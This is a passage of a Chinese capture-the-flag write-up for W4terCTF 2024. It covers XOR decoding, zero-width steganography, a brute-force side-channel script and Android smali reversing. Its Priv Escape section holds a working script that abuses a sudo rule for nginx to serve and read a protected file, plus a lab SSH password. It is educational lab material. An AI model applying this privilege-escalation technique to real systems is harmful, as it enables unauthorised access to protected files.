class="token keyword">for</span> i<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>h</pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>l</pre></td></tr><tr><td data-num="15"></td><td><pre>    ret <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> arr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        ret <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    s<span class="token operator">=</span>s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p>得到:</p><p><code>W4terCTF&#123;H@V3_fuN_w1TH_yOUr_F!rSt_5pAM_eMa!I_IN_2024&#125;</code></p><h2 id="gzgpt"><a class="anchor" href="#gzgpt">#</a> GZGPT</h2><p>这里漏出鸡脚了：</p><p><img data-src="https://s2.loli.net/2024/04/29/BWxuKC4v8Zzc3bj.png" alt="鸡脚"></p><p>于是分析每一行的末尾：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"output.log"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>tails <span class="token operator">=</span> <span class="token punctuation">[</span>line<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>tails <span class="token operator">=</span> <span class="token punctuation">[</span>tail <span class="token keyword">for</span> tail <span class="token keyword">in</span> tails <span class="token keyword">if</span> tail<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">'\u200c'</span><span class="token punctuation">,</span> <span class="token string">'\u200d'</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>tails<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span></pre></td></tr></table></figure><pre><code>['\u200c\u200d\u200c\u200d\u200c\u200d\u200d\u200d',
 '\u200c\u200c\u200d\u200d\u200c\u200d\u200c\u200c',
 '\u200c\u200d\u200d\u200d\u200c\u200d\u200c\u200c',
 '\u200c\u200d\u200d\u200c\u200c\u200d\u200c\u200d',
 '\u200c\u200d\u200d\u200d\u200c\u200c\u200d\u200c',
 '\u200c\u200d\u200c\u200c\u200c\u200c\u200d\u200d',
 '\u200c\u200d\u200c\u200d\u200c\u200d\u200c\u200c',
 '\u200c\u200d\u200c\u200c\u200c\u200d\u200d\u200c',
 '\u200c\u200d\u200d\u200d\u200d\u200c\u200d\u200d',
 '\u200c\u200d\u200c\u200c\u200d\u200c\u200c\u200d']
</code></pre><p>可以看到有一些行的末尾有且仅有 8 个这种不可见字符，不是所有行都有，但是经验证，这样的行的数量每次都是恒定的。</p><p>八位，两种字符，一种当 0 一种当 1 试了试：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>d <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token string">"\u200c"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token string">"\u200d"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>b_tails <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> tail<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> tail <span class="token keyword">in</span> tails<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>b_tails</pre></td></tr></table></figure><pre><code>W4terCTF&#123;INTRUdER_o1_mY_H3ART_ln_APR1l&#125;W4terCTF&#123;INTRUdER_o1_mY_H3ART_ln_APR1l&#125;W4terCTF&#123;INTRUdER_o1_mY_H3ART_ln_APR1
</code></pre><h2 id="priv-escape"><a class="anchor" href="#priv-escape">#</a> Priv Escape</h2><p>首先找 flag ，在 <code>/tmp/flag</code> 找到了，但是没权限读！然后还发现这个文件的 owner 居然不是 <code>root</code> ，而是 <code>r00t</code> （什么高仿 root），这或许就意味着不需要 root 权限也能得到 flag 。</p><p><code>find</code> 查找和 <code>r00t</code> 用户有关的所有文件、目录，会发现 nginx 非常可疑，但这还不够。</p><p>关键切入点在于查看与本用户执行权限相关信息：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token parameter variable">-l</span></pre></td></tr></table></figure><p>然后发现 nginx 露出了鸡脚：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre>User W4terCTFPlayer may run the following commands on</pre></td></tr><tr><td data-num="2"></td><td><pre>        priv-escape-5ee9f22c905b4d86:</pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token punctuation">(</span>r00t<span class="token punctuation">)</span> NOPASSWD: /usr/sbin/nginx</pre></td></tr></table></figure><p>这意味着我们的用户可以以 <code>r00t</code> 的身份运行 nginx ，那么依靠 nginx 的网页我们就能读取 <code>/tmp/flag</code> 。</p><p>直接运行 <code>sudo -u r00t nginx</code> ，虽然启动了 nginx ，但是我们不知道咋访问 <code>/tmp/flag</code> ，因为权限问题也无法将 <code>/tmp/flag</code> 软链接到 <code>/var/www/html</code> ，所以我们搞了个脚本用自己的 nginx 配置：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>hack.sh</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token shebang important">#!/bin/bash</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">cp</span> <span class="token parameter variable">-rf</span> /etc/nginx /home/W4terCTFPlayer/nginx</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">"user r00t;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>worker_processes auto;</pre></td></tr><tr><td data-num="7"></td><td><pre>pid /home/W4terCTFPlayer/nginx/nginx.pid;</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>events &#123;</pre></td></tr><tr><td data-num="10"></td><td><pre>	worker_connections 768;</pre></td></tr><tr><td data-num="11"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>http &#123;</pre></td></tr><tr><td data-num="14"></td><td><pre>	sendfile on;</pre></td></tr><tr><td data-num="15"></td><td><pre>	tcp_nopush on;</pre></td></tr><tr><td data-num="16"></td><td><pre>	types_hash_max_size 2048;</pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>	include /home/W4terCTFPlayer/nginx/mime.types;</pre></td></tr><tr><td data-num="19"></td><td><pre>	default_type application/octet-stream;</pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</pre></td></tr><tr><td data-num="23"></td><td><pre>	ssl_prefer_server_ciphers on;</pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>	gzip on;</pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>	include /home/W4terCTFPlayer/nginx/conf.d/*.conf;</pre></td></tr><tr><td data-num="28"></td><td><pre>	include /home/W4terCTFPlayer/nginx/sites-enabled/*;</pre></td></tr><tr><td data-num="29"></td><td><pre>&#125;" <span class="token operator">></span> /home/W4terCTFPlayer/nginx/nginx.conf</pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token function">rm</span> /home/W4terCTFPlayer/nginx/sites-enabled/default</pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">"server &#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>	listen 8083 default_server;</pre></td></tr><tr><td data-num="35"></td><td><pre>	listen [::]:8083 default_server;</pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre>	root /tmp;</pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>	index index.html index.nginx-debian.html;</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>	server_name _;</pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre>	location / &#123;</pre></td></tr><tr><td data-num="44"></td><td><pre>		try_files <span class="token variable">$uri</span> <span class="token variable">$uri</span>/ =404;</pre></td></tr><tr><td data-num="45"></td><td><pre>	&#125;</pre></td></tr><tr><td data-num="46"></td><td><pre>&#125;" <span class="token operator">></span> /home/W4terCTFPlayer/nginx/sites-enabled/default</pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token builtin class-name">echo</span> <span class="token string">'&lt;!DOCTYPE html></span></pre></td></tr><tr><td data-num="49"></td><td><pre>&lt;html lang="en"></pre></td></tr><tr><td data-num="50"></td><td><pre>&lt;head></pre></td></tr><tr><td data-num="51"></td><td><pre>    &lt;meta charset="UTF-8"></pre></td></tr><tr><td data-num="52"></td><td><pre>    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"></pre></td></tr><tr><td data-num="53"></td><td><pre>    &lt;title>Document&lt;/title></pre></td></tr><tr><td data-num="54"></td><td><pre>&lt;/head></pre></td></tr><tr><td data-num="55"></td><td><pre>&lt;body></pre></td></tr><tr><td data-num="56"></td><td><pre>    114514</pre></td></tr><tr><td data-num="57"></td><td><pre>&lt;/body></pre></td></tr><tr><td data-num="58"></td><td><pre>&lt;/html>' <span class="token operator">></span> /tmp/index.html</pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token function">chmod</span> <span class="token number">777</span> <span class="token parameter variable">-R</span> /home/W4terCTFPlayer <span class="token comment"># 不要忘了给 r00t 我们的文件目录访问权限</span></pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token function">sudo</span> <span class="token parameter variable">-u</span> r00t nginx <span class="token parameter variable">-c</span> /home/W4terCTFPlayer/nginx/nginx.conf <span class="token comment"># 启动 nginx</span></pre></td></tr></table></figure><p>然后执行：</p><figure class="highlight shell"><figcaption data-lang="Bash"><span>shell</span></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># We1c0meToW4terCTF2024!</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">scp</span> <span class="token parameter variable">-P</span> <span class="token number">64780</span> hack.sh W4terCTFPlayer@127.0.0.1:/home/W4terCTFPlayer  <span class="token comment"># 输入一下密码</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token function">ssh</span> W4terCTFPlayer@127.0.0.1 <span class="token parameter variable">-p</span> <span class="token number">64780</span>  <span class="token comment"># 输入一下密码</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token function">chmod</span> <span class="token number">777</span> hack.sh</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>./hack.sh</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment"># sudo -u r00t nginx -s reload -c /home/W4terCTFPlayer/nginx/nginx.conf  # 用来重新加载 nginx 配置文件</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token function">curl</span> https://127.0.0.1:8083/flag</pre></td></tr></table></figure><p>然而中途遇到了阻碍，写 WP 的时候才发现似乎是因为我们写脚本的同学用的 mac 的 shell 导致的，在 echo 的时候将 <code>/home/W4terCTFPlayer/nginx/sites-enabled/default</code> 里的 <code>$uri</code> 当成了环境变量？！然后 nginx 返回 301 ...... 脚本里把 <code>$uri</code> 改成 <code>\$uri</code> 就好了</p><p><code>W4terCTF&#123;eScAp3_THE_BouNdarles_OF_n9lnX_pRIvi1eGeS&#125;</code></p><h1 id="reverse"><a class="anchor" href="#reverse">#</a> Reverse</h1><h2 id="bruteforceme"><a class="anchor" href="#bruteforceme">#</a> BruteforceMe</h2><p>下载的附件是一个程序，运行程序后可以输入 flag，程序会判断 flag 长度是否正确，如果长度正确，会给出 flag 经过加密后经比对有多少字符符合</p><p>所以，只需要一个 python 脚本猜测每一位的字符，脚本如下</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> subprocess</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="3"></td><td><pre>input_data <span class="token operator">=</span> <span class="token string">"W4terCTF###################################"</span> <span class="token comment"># len = 43</span></pre></td></tr><tr><td data-num="4"></td><td><pre>arr <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>input_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>voc <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;_"</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    input_data <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    command <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"./BruteforceMe"</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token comment"># 作为子进程启动外部程序</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>command<span class="token punctuation">,</span> stdin<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token comment"># 输入数据到程序的标准输入</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>write<span class="token punctuation">(</span>input_data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    process<span class="token punctuation">.</span>stdin<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment"># 从标准输出读取程序的输出</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    output_data<span class="token punctuation">,</span> _ <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token comment">#print(output_data)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    j<span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">for</span> i<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output_data<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    tmp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">while</span> output_data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        tmp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        j<span class="token operator">+=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    c_num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token comment">#print(input_data)</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token comment"># 打印输出</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token comment">#print(output_data)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token comment">#print(c_num)</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">return</span> c_num</pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>    </pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token keyword">while</span> get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token comment"># 随机打乱 voc</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    voc <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>voc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>voc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    voc <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>voc<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">for</span> t <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">43</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        old <span class="token operator">=</span> get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token comment">#print(f"&#123;t&#125;,&#123;old&#125;: ")</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        cur_best <span class="token operator">=</span> old</pre></td></tr><tr><td data-num="50"></td><td><pre>        <span class="token keyword">for</span> v <span class="token keyword">in</span> voc<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>            old_arr <span class="token operator">=</span> arr<span class="token punctuation">[</span>t<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="52"></td><td><pre>            arr<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span>v</pre></td></tr><tr><td data-num="53"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="54"></td><td><pre>            new <span class="token operator">=</span> get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>            arr<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span>old_arr</pre></td></tr><tr><td data-num="56"></td><td><pre>            <span class="token keyword">if</span> new <span class="token operator">>=</span> cur_best<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>                <span class="token comment">#print(f"&#123;v&#125;,&#123;new&#125;;",end=' ')</span></pre></td></tr><tr><td data-num="58"></td><td><pre>                arr<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span>v</pre></td></tr><tr><td data-num="59"></td><td><pre>                cur_best <span class="token operator">=</span> new</pre></td></tr><tr><td data-num="60"></td><td><pre>        <span class="token comment">#print('')</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        </pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"best: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_flag<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>在和 BruteforceMe 同文件夹下执行这个脚本，直到程序遇到报错停止，最后一个输出就是 flag</p><p>一般 while 循环执行 3 轮就能得到结果，运行时间 1 分钟以内</p><p><code>W4terCTF&#123;UnR3IAtED_8y73S_CAN_6e_3nUmErAT3d&#125;</code></p><h2 id="安安又卓卓"><a class="anchor" href="#安安又卓卓">#</a> 安安又卓卓</h2><h3 id="第一问剪刀石头布"><a class="anchor" href="#第一问剪刀石头布">#</a> 第一问：剪刀石头布</h3><p>这一问可以使用 APKTool 进行逆向</p><p>用法参考 https://juejin.cn/post/7216968724938195001</p><p>可以得到反编译的 Smali 代码</p><p>在 <code>smali\com\w4ter\w4terctf2024\FirstChall.smali</code> 中找到以下代码</p><figure class="highlight smali"><figcaption data-lang="smali"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">:</span><span class="token label property">array_0</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">.array-data</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="3"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token number">0x33s</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token number">0x33s</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token number">0x31s</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token number">0x31s</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token number">0x31s</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token number">0x31s</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token number">0x31s</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token number">0x33s</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token number">0x31s</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token number">0x32s</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token operator">..</span><span class="token operator">..</span><span class="token operator">..</span></pre></td></tr></table></figure><p>经验证，这是机器的出拳顺序</p><p>要想赢得机器，对手出 2，我出 1，对手出 3，我出 2，对手出 1，我出 3。</p><p>运行下面的脚本，得到我方出拳顺序</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>rival<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span 